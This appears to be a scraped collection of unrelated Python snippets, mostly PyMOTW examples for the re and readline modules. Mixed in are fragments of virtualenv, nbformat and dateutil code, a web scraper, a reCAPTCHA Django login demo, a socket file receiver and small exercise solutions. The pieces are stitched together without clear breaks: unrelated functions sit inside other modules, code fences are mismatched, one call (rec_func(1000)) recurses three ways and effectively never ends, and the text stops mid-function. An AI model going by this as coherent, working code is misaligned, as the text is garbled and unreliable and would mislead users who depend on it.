#```


```pyLooking at groups on a match object```


```py

#end_pymotw_header
import re

text = 'This is some text -- with punctuation.'

print(text)
print()

patterns = [
    (r'^(\w+)', 'word at start of string'),
    (r'(\w+)\S*$', 'word at end, with optional punctuation'),
    (r'(\bt\w+)\W+(\w+)', 'word starting with t, another word'),
    (r'(\w+t)\b', 'word ending with t'),
]

for pattern, desc in patterns:
    regex = re.compile(pattern)
    match = regex.search(text)
    print("'{}' ({})\n".format(pattern, desc))
    print('  ', match.groups())
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyNaming pattern groups```


```py

#end_pymotw_header
import re

text = 'This is some text -- with punctuation.'

print(text)
print()

patterns = [
    r'^(?P<first_word>\w+)',
    r'(?P<last_word>\w+)\S*$',
    r'(?P<t_word>\bt\w+)\W+(?P<other_word>\w+)',
    r'(?P<ends_with_t>\w+t)\b',
]

for pattern in patterns:
    regex = re.compile(pattern)
    match = regex.search(text)
    print("'{}'".format(pattern))
    print('  ', match.groups())
    print('  ', match.groupdict())
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyNested groups```


```py

#end_pymotw_header
from re_test_patterns_groups import test_patterns

test_patterns(
    'abbaabbba',
    [(r'a((a*)(b*))', 'a followed by 0-n a and 0-n b')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyNoncapturing groups```


```py

#end_pymotw_header
from re_test_patterns_groups import test_patterns

test_patterns(
    'abbaabbba',
    [(r'a((a+)|(b+))', 'capturing form'),
     (r'a((?:a+)|(?:b+))', 'noncapturing')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyID-based conditional expressions```


```py

#end_pymotw_header
import re

address = re.compile(
    '''
    ^

    # A name is made up of letters, and may include "."
    # for title abbreviations and middle initials.
    (?P<name>
       ([\w.]+\s+)*[\w.]+
     )?
    \s*

    # Email addresses are wrapped in angle brackets, but
    # only if a name is found.
    (?(name)
      # remainder wrapped in angle brackets because
      # there is a name
      (?P<brackets>(?=(<.*>$)))
      |
      # remainder does not include angle brackets without name
      (?=([^<].*[^>]$))
     )

    # Look for a bracket only if the look-ahead assertion
    # found both of them.
    (?(brackets)<|\s*)

    # The address itself: username@domain.tld
    (?P<email>
      [\w\d.+-]+       # username
      @
      ([\w\d.]+\.)+    # domain name prefix
      (com|org|edu)    # limit the allowed top-level domains
     )

    # Look for a bracket only if the look-ahead assertion
    # found both of them.
    (?(brackets)>|\s*)

    $
    ''',
    re.VERBOSE)

candidates = [
    u'First Last <first.last@example.com>',
    u'No Brackets first.last@example.com',
    u'Open Bracket <first.last@example.com',
    u'Close Bracket first.last@example.com>',
    u'no.brackets@example.com',
]

for candidate in candidates:
    print('Candidate:', candidate)
    match = address.search(candidate)
    if match:
        print('  Match name :', match.groupdict()['name'])
        print('  Match email:', match.groupdict()['email'])
    else:
        print('  No match')

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyPositive look-ahead assertion```


```py

#end_pymotw_header
import re

address = re.compile(
    '''
    # A name is made up of letters, and may include "."
    # for title abbreviations and middle initials.
    ((?P<name>
       ([\w.,]+\s+)*[\w.,]+
     )
     \s+
    ) # name is no longer optional

    # LOOKAHEAD
    # Email addresses are wrapped in angle brackets, but only
    # if both are present or neither is.
    (?= (<.*>$)       # remainder wrapped in angle brackets
        |
        ([^<].*[^>]$) # remainder *not* wrapped in angle brackets
      )

    <? # optional opening angle bracket

    # The address itself: username@domain.tld
    (?P<email>
      [\w\d.+-]+       # username
      @
      ([\w\d.]+\.)+    # domain name prefix
      (com|org|edu)    # limit the allowed top-level domains
    )

    >? # optional closing angle bracket
    ''',
    re.VERBOSE)

candidates = [
    u'First Last <first.last@example.com>',
    u'No Brackets first.last@example.com',
    u'Open Bracket <first.last@example.com',
    u'Close Bracket first.last@example.com>',
]

for candidate in candidates:
    print('Candidate:', candidate)
    match = address.search(candidate)
    if match:
        print('  Name :', match.groupdict()['name'])
        print('  Email:', match.groupdict()['email'])
    else:
        print('  No match')

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLook behind assertion.```


```py

#end_pymotw_header
import re

twitter = re.compile(
    '''
    # A twitter handle: @username
    (?<=@)
    ([\w\d_]+)       # username
    ''',
    re.VERBOSE)

text = '''This text includes two Twitter handles.
One for @ThePSF, and one for the author, @doughellmann.
'''

print(text)
for match in twitter.findall(text):
    print('Handle:', match)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyMatching vs. searching```


```py

#end_pymotw_header
import re

text = 'This is some text -- with punctuation.'
pattern = 'is'

print('Text   :', text)
print('Pattern:', pattern)

m = re.match(pattern, text)
print('Match  :', m)
s = re.search(pattern, text)
print('Search :', s)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyNegative look ahead assertion.```


```py

#end_pymotw_header
import re

address = re.compile(
    '''
    ^

    # An address: username@domain.tld

    # Ignore noreply addresses
    (?!noreply@.*$)

    [\w\d.+-]+       # username
    @
    ([\w\d.]+\.)+    # domain name prefix
    (com|org|edu)    # limit the allowed top-level domains

    $
    ''',
    re.VERBOSE)

candidates = [
    u'first.last@example.com',
    u'noreply@example.com',
]

for candidate in candidates:
    print('Candidate:', candidate)
    match = address.search(candidate)
    if match:
        print('  Match:', candidate[match.start():match.end()])
    else:
        print('  No match')

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyNegative look behind assertion.```


```py

#end_pymotw_header
import re

address = re.compile(
    '''
    ^

    # An address: username@domain.tld

    [\w\d.+-]+       # username

    # Ignore noreply addresses
    (?<!noreply)

    @
    ([\w\d.]+\.)+    # domain name prefix
    (com|org|edu)    # limit the allowed top-level domains

    $
    ''',
    re.VERBOSE)

candidates = [
    u'first.last@example.com',
    u'noreply@example.com',
]

for candidate in candidates:
    print('Candidate:', candidate)
    match = address.search(candidate)
    if match:
        print('  Match:', candidate[match.start():match.end()])
    else:
        print('  No match')

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySplitting input based on a pattern.```


```py

#end_pymotw_header
import re

text = '''Paragraph one
on two lines.

Paragraph two.


Paragraph three.'''

for num, para in enumerate(re.findall(r'(.+?)\n{2,}',
                                      text,
                                      flags=re.DOTALL)
                           ):
    print(num, repr(para))
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyFind email addresses that match the person's name```


```py

#end_pymotw_header
import re

address = re.compile(
    r'''

    # The regular name
    (\w+)               # first name
    \s+
    (([\w.]+)\s+)?      # optional middle name or initial
    (\w+)               # last name

    \s+

    <

    # The address: first_name.last_name@domain.tld
    (?P<email>
      \1               # first name
      \.
      \4               # last name
      @
      ([\w\d.]+\.)+    # domain name prefix
      (com|org|edu)    # limit the allowed top-level domains
    )

    >
    ''',
    re.VERBOSE | re.IGNORECASE)

candidates = [
    u'First Last <first.last@example.com>',
    u'Different Name <first.last@example.com>',
    u'First Middle Last <first.last@example.com>',
    u'First M. Last <first.last@example.com>',
]

for candidate in candidates:
    print('Candidate:', candidate)
    match = address.search(candidate)
    if match:
        print('  Match name :', match.group(1), match.group(4))
        print('  Match email:', match.group(5))
    else:
        print('  No match')

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyFind email addresses that match the person's name```


```py

#end_pymotw_header
import re

address = re.compile(
    '''

    # The regular name
    (?P<first_name>\w+)
    \s+
    (([\w.]+)\s+)?      # optional middle name or initial
    (?P<last_name>\w+)

    \s+

    <

    # The address: first_name.last_name@domain.tld
    (?P<email>
      (?P=first_name)
      \.
      (?P=last_name)
      @
      ([\w\d.]+\.)+    # domain name prefix
      (com|org|edu)    # limit the allowed top-level domains
    )

    >
    ''',
    re.VERBOSE | re.IGNORECASE)

candidates = [
    u'First Last <first.last@example.com>',
    u'Different Name <first.last@example.com>',
    u'First Middle Last <first.last@example.com>',
    u'First M. Last <first.last@example.com>',
]

for candidate in candidates:
    print('Candidate:', candidate)
    match = address.search(candidate)
    if match:
        print('  Match name :', match.groupdict()['first_name'],
              end=' ')
        print(match.groupdict()['last_name'])
        print('  Match email:', match.groupdict()['email'])
    else:
        print('  No match')

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRepetition of patterns```


```py

#end_pymotw_header
from re_test_patterns import test_patterns

test_patterns(
    'abbaabbba',
    [('ab*', 'a followed by zero or more b'),
     ('ab+', 'a followed by one or more b'),
     ('ab?', 'a followed by zero or one b'),
     ('ab{3}', 'a followed by three b'),
     ('ab{2,3}', 'a followed by two to three b')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRepetition of patterns```


```py

#end_pymotw_header
from re_test_patterns import test_patterns

test_patterns(
    'abbaabbba',
    [('ab*?', 'a followed by zero or more b'),
     ('ab+?', 'a followed by one or more b'),
     ('ab??', 'a followed by zero or one b'),
     ('ab{3}?', 'a followed by three b'),
     ('ab{2,3}?', 'a followed by two to three b')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySearching a substring of the input.```


```py

#end_pymotw_header
import re

text = 'This is some text -- with punctuation.'
pattern = re.compile(r'\b\w*is\w*\b')

print('Text:', text)
print()

pos = 0
while True:
    match = pattern.search(text, pos)
    if not match:
        break
    s = match.start()
    e = match.end()
    print('  {:>2d} : {:>2d} = "{}"'.format(
        s, e - 1, text[s:e]))
    # Move forward in text for the next search
    pos = e

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySimple pattern examples.```


```py

#end_pymotw_header
import re

patterns = ['this', 'that']
text = 'Does this text match the pattern?'

print('Text: {!r}\n'.format(text))

for pattern in patterns:
    print('Seeking "{}" ->'.format(pattern), end=' ')

    if re.search(pattern, text) is None:
        print('no match')
    else:
        print('match!')

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySimple pattern examples.```


```py

#end_pymotw_header
import re

# Precompile the patterns
regexes = [
    re.compile(p)
    for p in ['this', 'that']
]
text = 'Does this text match the pattern?'

print('Text: {!r}\n'.format(text))

for regex in regexes:
    print('Seeking "{}" ->'.format(regex.pattern),
          end=' ')

    if regex.search(text):
        print('match!')
    else:
        print('no match')

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyMatch objects.```


```py

#end_pymotw_header
import re

pattern = 'this'
text = 'Does this text match the pattern?'

match = re.search(pattern, text)

s = match.start()
e = match.end()

print('Found "{}"\nin "{}"\nfrom {} to {} ("{}")'.format(
    match.re.pattern, match.string, s, e, text[s:e]))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySplitting input based on a pattern.```


```py

#end_pymotw_header
import re

text = '''Paragraph one
on two lines.

Paragraph two.


Paragraph three.'''

print('With findall:')
for num, para in enumerate(re.findall(r'(.+?)(\n{2,}|$)',
                                      text,
                                      flags=re.DOTALL)):
    print(num, repr(para))
    print()

print()
print('With split:')
for num, para in enumerate(re.split(r'\n{2,}', text)):
    print(num, repr(para))
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySplitting input based on a pattern.```


```py

#end_pymotw_header
import re

text = '''Paragraph one
on two lines.

Paragraph two.


Paragraph three.'''

print('With split:')
for num, para in enumerate(re.split(r'(\n{2,})', text)):
    print(num, repr(para))
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySubstitute based on patterns.```


```py

#end_pymotw_header
import re

bold = re.compile(r'\*{2}(.*?)\*{2}')

text = 'Make this **bold**.  This **too**.'

print('Text:', text)
print('Bold:', bold.sub(r'<b>\1</b>', text))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySubstitute based on patterns.```


```py

#end_pymotw_header
import re

bold = re.compile(r'\*{2}(.*?)\*{2}')

text = 'Make this **bold**.  This **too**.'

print('Text:', text)
print('Bold:', bold.sub(r'<b>\1</b>', text, count=1))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySubstitute based on patterns.```


```py

#end_pymotw_header
import re

bold = re.compile(r'\*{2}(?P<bold_text>.*?)\*{2}')

text = 'Make this **bold**.  This **too**.'

print('Text:', text)
print('Bold:', bold.sub(r'<b>\g<bold_text></b>', text))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySubstitute based on patterns.```


```py

#end_pymotw_header
import re

bold = re.compile(r'\*{2}(.*?)\*{2}')

text = 'Make this **bold**.  This **too**.'

print('Text:', text)
print('Bold:', bold.subn(r'<b>\1</b>', text))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyShow all matches for a list of patterns.```


```py

#end_pymotw_header
import re


def test_patterns(text, patterns):
    """Given source text and a list of patterns, look for
    matches for each pattern within the text and print
    them to stdout.
    """
    # Look for each pattern in the text and print the results
    for pattern, desc in patterns:
        print("'{}' ({})\n".format(pattern, desc))
        print("  '{}'".format(text))
        for match in re.finditer(pattern, text):
            s = match.start()
            e = match.end()
            substr = text[s:e]
            n_backslashes = text[:s].count('\\')
            prefix = '.' * (s + n_backslashes)
            print("  {}'{}'".format(prefix, substr))
        print()
    return


if __name__ == '__main__':
    test_patterns('abbaaabbbbaaaaa',
                  [('ab', "'a' followed by 'b'"),
                   ])

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyShow the groups within the matches for a pattern.```


```py

#end_pymotw_header
import re


def test_patterns(text, patterns):
    """Given source text and a list of patterns, look for
    matches for each pattern within the text and print
    them to stdout.
    """
    # Look for each pattern in the text and print the results
    for pattern, desc in patterns:
        print('{!r} ({})\n'.format(pattern, desc))
        print('  {!r}'.format(text))
        for match in re.finditer(pattern, text):
            s = match.start()
            e = match.end()
            prefix = ' ' * (s)
            print(
                '  {}{!r}{} '.format(prefix,
                                     text[s:e],
                                     ' ' * (len(text) - e)),
                end=' ',
            )
            print(match.groups())
            if match.groupdict():
                print('{}{}'.format(
                    ' ' * (len(text) - s),
                    match.groupdict()),
                )
        print()
    return

def reachNextLevel(experience, threshold, reward):
    """
    You are playing an RPG game. Currently your
    experience points (XP) total is equal to experience.
    To reach the next level your XP should be at least at
    threshold. If you kill the monster in front of you,
    you will gain more experience points in the amount
    of the reward.

    Given values experience, threshold and reward, check
    if you reach the next level after killing the monster.

 Time Complexity: O(1)
 Space Complexity: O(1)
    """
    return experience + reward >= threshold

# Reading files

# Enter file name which is in same directory as that of the program
fileName = str(input("File name : "))
fileToRead = open(fileName, "r")  # 'r' reads the file
print(fileToRead.read())  # reading file
fileToRead.close()  # closing the file

import os.path

from virtualenv.util.lock import NoOpFileLock

from .via_disk_folder import AppDataDiskFolder, PyInfoStoreDisk


class ReadOnlyAppData(AppDataDiskFolder):
    can_update = False

    def __init__(self, folder):  # type: (str) -> None
        if not os.path.isdir(folder):
            raise RuntimeError("read-only app data directory {} does not exist".format(folder))
        self.lock = NoOpFileLock(folder)

    def reset(self):  # type: () -> None
        raise RuntimeError("read-only app data does not support reset")

    def py_info_clear(self):  # type: () -> None
        raise NotImplementedError

    def py_info(self, path):
        return _PyInfoStoreDiskReadOnly(self.py_info_at, path)

    def embed_update_log(self, distribution, for_py_version):
        raise NotImplementedError


class _PyInfoStoreDiskReadOnly(PyInfoStoreDisk):
    def write(self, content):
        raise RuntimeError("read-only app data python info cannot be updated")


__all__ = ("ReadOnlyAppData",)
````

````pyAPI for reading notebooks of different versions"""

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

import json

class NotJSONError(ValueError):
    pass

def parse_json(s, **kwargs):
    """Parse a JSON string into a dict."""
    try:
        nb_dict = json.loads(s, **kwargs)
    except ValueError as e:
        # Limit the error message to 80 characters.  Display whatever JSON will fit.
        raise NotJSONError(("Notebook does not appear to be JSON: %r" % s)[:77] + "...") from e
    return nb_dict

# High level API

def get_version(nb):
    """Get the version of a notebook.

    Parameters
    ----------
    nb : dict
        NotebookNode or dict containing notebook data.

    Returns
    -------
    Tuple containing major (int) and minor (int) version numbers
    """
    major = nb.get('nbformat', 1)
    minor = nb.get('nbformat_minor', 0)
    return (major, minor)


def reads(s, **kwargs):
    """Read a notebook from a json string and return the
    NotebookNode object.

    This function properly reads notebooks of any version.  No version
    conversion is performed.

    Parameters
    ----------
    s : unicode | bytes
        The raw string or bytes object to read the notebook from.

    Returns
    -------
    nb : NotebookNode
        The notebook that was read.
    """
    from . import versions, NBFormatError

    nb_dict = parse_json(s, **kwargs)
    (major, minor) = get_version(nb_dict)
    if major in versions:
        return versions[major].to_notebook_json(nb_dict, minor=minor)
    else:
        raise NBFormatError('Unsupported nbformat version %s' % major)


def read(fp, **kwargs):
    """Read a notebook from a file and return the NotebookNode object.

    This function properly reads notebooks of any version.  No version
    conversion is performed.

    Parameters
    ----------
    fp : file
        Any file-like object with a read method.

    Returns
    -------
    nb : NotebookNode
        The notebook that was read.
    """
    return reads(fp.read(), **kwargs)

```









---


```py



#end_pymotw_header
try:
    import gnureadline as readline
except ImportError:
    import readline
import logging

LOG_FILENAME = '/tmp/completer.log'
logging.basicConfig(
    format='%(message)s',
    filename=LOG_FILENAME,
    level=logging.DEBUG,
)


class BufferAwareCompleter:

    def __init__(self, options):
        self.options = options
        self.current_candidates = []

    def complete(self, text, state):
        response = None
        if state == 0:
            # This is the first time for this text,
            # so build a match list.

            origline = readline.get_line_buffer()
            begin = readline.get_begidx()
            end = readline.get_endidx()
            being_completed = origline[begin:end]
            words = origline.split()

            logging.debug('origline=%s', repr(origline))
            logging.debug('begin=%s', begin)
            logging.debug('end=%s', end)
            logging.debug('being_completed=%s', being_completed)
            logging.debug('words=%s', words)

            if not words:
                self.current_candidates = sorted(
                    self.options.keys()
                )
            else:
                try:
                    if begin == 0:
                        # first word
                        candidates = self.options.keys()
                    else:
                        # later word
                        first = words[0]
                        candidates = self.options[first]

                    if being_completed:
                        # match options with portion of input
                        # being completed
                        self.current_candidates = [
                            w for w in candidates
                            if w.startswith(being_completed)
                        ]
                    else:
                        # matching empty string,
                        # use all candidates
                        self.current_candidates = candidates

                    logging.debug('candidates=%s',
                                  self.current_candidates)

                except (KeyError, IndexError) as err:
                    logging.error('completion error: %s', err)
                    self.current_candidates = []

        try:
            response = self.current_candidates[state]
        except IndexError:
            response = None
        logging.debug('complete(%s, %s) => %s',
                      repr(text), state, response)
        return response


def input_loop():
    line = ''
    while line != 'stop':
        line = input('Prompt ("stop" to quit): ')
        print('Dispatch {}'.format(line))


# Register our completer function
completer = BufferAwareCompleter({
    'list': ['files', 'directories'],
    'print': ['byname', 'bysize'],
    'stop': [],
})
readline.set_completer(completer.complete)

# Use the tab key for completion
readline.parse_and_bind('tab: complete')

# Prompt the user for text
input_loop()

```









---


```py



#end_pymotw_header
try:
    import gnureadline as readline
except ImportError:
    import readline
import logging

LOG_FILENAME = '/tmp/completer.log'
logging.basicConfig(
    format='%(message)s',
    filename=LOG_FILENAME,
    level=logging.DEBUG,
)


class SimpleCompleter:

    def __init__(self, options):
        self.options = sorted(options)

    def complete(self, text, state):
        response = None
        if state == 0:
            # This is the first time for this text,
            # so build a match list.
            if text:
                self.matches = [
                    s
                    for s in self.options
                    if s and s.startswith(text)
                ]
                logging.debug('%s matches: %s',
                              repr(text), self.matches)
            else:
                self.matches = self.options[:]
                logging.debug('(empty input) matches: %s',
                              self.matches)

        # Return the state'th item from the match list,
        # if we have that many.
        try:
            response = self.matches[state]
        except IndexError:
            response = None
        logging.debug('complete(%s, %s) => %s',
                      repr(text), state, repr(response))
        return response


def input_loop():
    line = ''
    while line != 'stop':
        line = input('Prompt ("stop" to quit): ')
        print('Dispatch {}'.format(line))


# Register the completer function
OPTIONS = ['start', 'stop', 'list', 'print']
readline.set_completer(SimpleCompleter(OPTIONS).complete)

# Use the tab key for completion
readline.parse_and_bind('tab: complete')

# Prompt the user for text
input_loop()

```









---


```py



#end_pymotw_header
try:
    import gnureadline as readline
except ImportError:
    import readline
import logging
import os

LOG_FILENAME = '/tmp/completer.log'
HISTORY_FILENAME = '/tmp/completer.hist'

logging.basicConfig(
    format='%(message)s',
    filename=LOG_FILENAME,
    level=logging.DEBUG,
)


def get_history_items():
    num_items = readline.get_current_history_length() + 1
    return [
        readline.get_history_item(i)
        for i in range(1, num_items)
    ]


class HistoryCompleter:

    def __init__(self):
        self.matches = []

    def complete(self, text, state):
        response = None
        if state == 0:
            history_values = get_history_items()
            logging.debug('history: %s', history_values)
            if text:
                self.matches = sorted(
                    h
                    for h in history_values
                    if h and h.startswith(text)
                )
            else:
                self.matches = []
            logging.debug('matches: %s', self.matches)
        try:
            response = self.matches[state]
        except IndexError:
            response = None
        logging.debug('complete(%s, %s) => %s',
                      repr(text), state, repr(response))
        return response


def input_loop():
    if os.path.exists(HISTORY_FILENAME):
        readline.read_history_file(HISTORY_FILENAME)
    print('Max history file length:',
          readline.get_history_length())
    print('Startup history:', get_history_items())
    try:
        while True:
            line = input('Prompt ("stop" to quit): ')
            if line == 'stop':
                break
            if line:
                print('Adding {!r} to the history'.format(line))
    finally:
        print('Final history:', get_history_items())
        readline.write_history_file(HISTORY_FILENAME)


# Register our completer function
readline.set_completer(HistoryCompleter().complete)

# Use the tab key for completion
readline.parse_and_bind('tab: complete')

# Prompt the user for text
input_loop()

```









---


```py



#end_pymotw_header
try:
    import gnureadline as readline
except ImportError:
    import readline


def startup_hook():
    readline.insert_text('from startup_hook')


def pre_input_hook():
    readline.insert_text(' from pre_input_hook')
    readline.redisplay()


readline.set_startup_hook(startup_hook)
readline.set_pre_input_hook(pre_input_hook)
readline.parse_and_bind('tab: complete')

while True:
    line = input('Prompt ("stop" to quit): ')
    if line == 'stop':
        break
    print('ENTERED: {!r}'.format(line))

```









---


```py



#end_pymotw_header
try:
    import gnureadline as readline
except ImportError:
    import readline

readline.parse_and_bind('tab: complete')
readline.parse_and_bind('set editing-mode vi')

while True:
    line = input('Prompt ("stop" to quit): ')
    if line == 'stop':
        break
    print('ENTERED: {!r}'.format(line))

```









---


```py



#end_pymotw_header
try:
    import gnureadline as readline
except ImportError:
    import readline

readline.read_init_file('myreadline.rc')

while True:
    line = input('Prompt ("stop" to quit): ')
    if line == 'stop':
        break
    print('ENTERED: {!r}'.format(line))

# python tutor
def count_unavailable_info(filename):
    import os
    import pprint

    # read file
    with open(os.path.join(os.getcwd(), filename), "r") as inFile:

        # store data in stack
        data = []

        # split data using delimiter "," every line
        for line in inFile:
            data.extend(line.split(","))

        # check data, can be uncommented
        pprint.pprint(data)

        # # stack for unavailable data (i.e. "0")
        # unavail = []

        # alternative, without using stack
        zeroes = 0

        # check for any data that is unavailable, i.e. "0"
        for item in data:
            # add the condition 'item == "0\n"'
            # to account for zeroes in the end of the line
            # with suffix \n
            if item == "0" or item == "0\n":
                zeroes += 1

        # return number of unavailable data (i.e. "0")
        return zeroes


fn = "data.csv"
print(count_unavailable_info(fn))

import requests
# Pandas dataframe is 2D size-mutable,tabular data with labeled axes
import pandas as pd
# BeautifulSoup is a python library for pulling data out of HTML and XML files
from bs4 import BeautifulSoup
def getdata(url):
    r=requests.get(url) # Accessing all required data from url site and store in data.
    return r.text
htmldata=getdata("https://www.goodreturns.in/petrol-price.html")
soup=BeautifulSoup(htmldata,'html.parser') # It takes text of page as argument and then parse it with html.parser
mydatastr='' #initialize the table str with null
result=[]
for table in soup.find_all('tr'):
    mydatastr+=table.get_text()
mydatastr=mydatastr[1:]
itemlist=mydatastr.split("\n\n")
for item in itemlist[:-5]:
    result.append(item.split("\n"))
df=pd.DataFrame(result[:-8]) # DataFrame align the data in a tabular fashion in rows and columns
print(df)
import logging
import os
import tempfile
import shutil
import json
from subprocess import check_call
from tarfile import TarFile

from dateutil.zoneinfo import METADATA_FN, ZONEFILENAME


def rebuild(filename, tag=None, format="gz", zonegroups=[], metadata=None):
    """Rebuild the internal timezone info in dateutil/zoneinfo/zoneinfo*tar*

    filename is the timezone tarball from ``ftp.iana.org/tz``.

    """
    tmpdir = tempfile.mkdtemp()
    zonedir = os.path.join(tmpdir, "zoneinfo")
    moduledir = os.path.dirname(__file__)
    try:
        with TarFile.open(filename) as tf:
            for name in zonegroups:
                tf.extract(name, tmpdir)
            filepaths = [os.path.join(tmpdir, n) for n in zonegroups]
            try:
                check_call(["zic", "-d", zonedir] + filepaths)
            except OSError as e:
                _print_on_nosuchfile(e)
                raise
        # write metadata file
        with open(os.path.join(zonedir, METADATA_FN), 'w') as f:
            json.dump(metadata, f, indent=4, sort_keys=True)
        target = os.path.join(moduledir, ZONEFILENAME)
        with TarFile.open(target, "w:%s" % format) as tf:
            for entry in os.listdir(zonedir):
                entrypath = os.path.join(zonedir, entry)
                tf.add(entrypath, entry)
    finally:
        shutil.rmtree(tmpdir)


def _print_on_nosuchfile(e):
    """Print helpful troubleshooting message

    e is an exception raised by subprocess.check_call()

    """
    if e.errno == 2:
        logging.error(
            "Could not find zic. Perhaps you need to install "
            "libc-bin or some other package that provides it, "
            "or it's not in your PATH?")

def rec_func(n):
    if n == 0:
        return
    print(n)
    rec_func(n - 1)
    rec_func(n - 2)
    rec_func(n - 3)

z = 12

rec_func(1000)```


```py
Recaptcha is a free captcha service offered by Google in order to secure websites and
forms.  At https://www.google.com/recaptcha/admin/create you can create new recaptcha
keys and see the keys that your have already created.
* Keep in mind that recaptcha doesn't work with localhost
When you create a recaptcha key, your will get two separate keys: ClientKey & SecretKey.
ClientKey should be kept in your site's front end
SecretKey should be kept in your site's  back end

# An example HTML login form with recaptcha tag is shown below

    <form action="" method="post">
        <h2 class="text-center">Log in</h2>
        {% csrf_token %}
        <div class="form-group">
            <input type="text" name="username" required="required">
        </div>
        <div class="form-group">
            <input type="password" name="password" required="required">
        </div>
        <div class="form-group">
            <button type="submit">Log in</button>
        </div>
        <!-- Below is the recaptcha tag of html -->
        <div class="g-recaptcha" data-sitekey="ClientKey"></div>
    </form>

    <!-- Below is the recaptcha script to be kept inside html tag -->
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>

Below a Django function for the views.py file contains a login form for demonstrating
recaptcha verification.```


```py
import requests

try:
    from django.contrib.auth import authenticate, login
    from django.shortcuts import redirect, render
except ImportError:
    authenticate = login = render = redirect = print


def login_using_recaptcha(request):
    # Enter your recaptcha secret key here
    secret_key = "secretKey"
    url = "https://www.google.com/recaptcha/api/siteverify"

    # when method is not POST, direct user to login page
    if request.method != "POST":
        return render(request, "login.html")

    # from the frontend, get username, password, and client_key
    username = request.POST.get("username")
    password = request.POST.get("password")
    client_key = request.POST.get("g-recaptcha-response")

    # post recaptcha response to Google's recaptcha api
    response = requests.post(url, data={"secret": secret_key, "response": client_key})
    # if the recaptcha api verified our keys
    if response.json().get("success", False):
        # authenticate the user
        user_in_database = authenticate(request, username=username, password=password)
        if user_in_database:
            login(request, user_in_database)
            return redirect("/your-webpage")
    return render(request, "login.html")

if __name__ == "__main__":
    import socket  # Import socket module

    sock = socket.socket()  # Create a socket object
    host = socket.gethostname()  # Get local machine name
    port = 12312

    sock.connect((host, port))
    sock.send(b"Hello server!")

    with open("Received_file", "wb") as out_file:
        print("File opened")
        print("Receiving data...")
        while True:
            data = sock.recv(1024)
            print(f"{data = }")
            if not data:
                break
            out_file.write(data)  # Write data to a file

    print("Successfully got the file")
    sock.close()
    print("Connection closed")

#!/usr/bin/python

import math
# synopsis :
# Your function should output the maximum number of whole batches that can be made for the supplied recipe using the ingredients available to you,
# as indicated by the second dictionary.

def recipe_batches(recipe, ingredients):
  # had a read over this for general dictionary stuff : http://www.pythonlearn.com/html-009/book010.html
  # also to address a minimalistic approach
  # this one feels like it should be fairly straight forward. looking up a few builtins

  # initial thoughts were to use a min on the ingredients against an element vs 0 and use a single for loop to make sure i am only looping on a low factor
  # but it seems that using a division i may need to fix up the return maybe floor or int()
  # return min(ingredients.get(elem, 0) / num for elem, num in recipe.items()) # FIXME: possibly cast to int?

  # testing with int variation casting the division in to an int for the return as it seems that we get a 2.5 at times which was failing
  return min(int(ingredients.get(elem, 0) / num) for elem, num in recipe.items()) # fixed passing!


if __name__ == '__main__':
  # Change the entries of these dictionaries to test
  # your implementation with different inputs
  recipe = { 'milk': 100, 'butter': 50, 'flour': 5 }
  ingredients = { 'milk': 132, 'butter': 48, 'flour': 51 }
  print("{batches} batches can be made from the available ingredients: {ingredients}.".format(batches=recipe_batches(recipe, ingredients), ingredients=ingredients))
# Suppose you have a random list of people standing in a queue.
# Each person is described by a pair of integers (h, k),
# where h is the height of the person and k is the number of people
# in front of this person who have a height greater than or equal to h.
# Write an algorithm to reconstruct the queue.

# Note:
# The number of people is less than 1,100.

# Example

# Input:
# [[7,0], [4,4], [7,1], [5,0], [6,1], [5,2]]

# Output:
# [[5,0], [7,0], [5,2], [6,1], [4,4], [7,1]]


def reconstruct_queue(people):
    """
    :type people: List[List[int]]
    :rtype: List[List[int]]
    """
    queue = []
    people.sort(key=lambda x: (-x[0], x[1]))
    for h, k in people:
        queue.insert(k, [h, k])
    return queue

# turtle:
from turtle import *

# :
width(4)

# :
forward(200)
# 90:
right(90)

# :
pencolor("red")
forward(100)
right(90)

pencolor("green")
forward(200)
right(90)


pencolor("blue")
forward(100)
right(90)

# done()，:
done()
````

````py
Author: ALEXEY SARAPULOV
Created On: 23 August 2017```


```py

# To test if two rectangle intersect, we only have to find out
# if their projections intersect on all of the coordinate axes

import inspect


class Coord:
    """Coord
    Class to initialize Coordinate of one point
    """

    def __init__(self, x, y):
        self.x = x
        self.y = y


class SimpleRectangle:
    """SimpleRectangle
    Class to initialize Body of Object
    """

    def __init__(self, coord1, coord2):
        """
        :type coord1: object of class Coord
        :type coord2: object of class Coord
        """
        self.min_x = coord1.x
        self.min_y = coord1.y
        self.max_x = coord2.x
        self.max_y = coord2.y


def broad_phase(simpleRect1, simpleRect2):
    """
    :type simpleRect1: object
    :type simpleRect2: object
    """
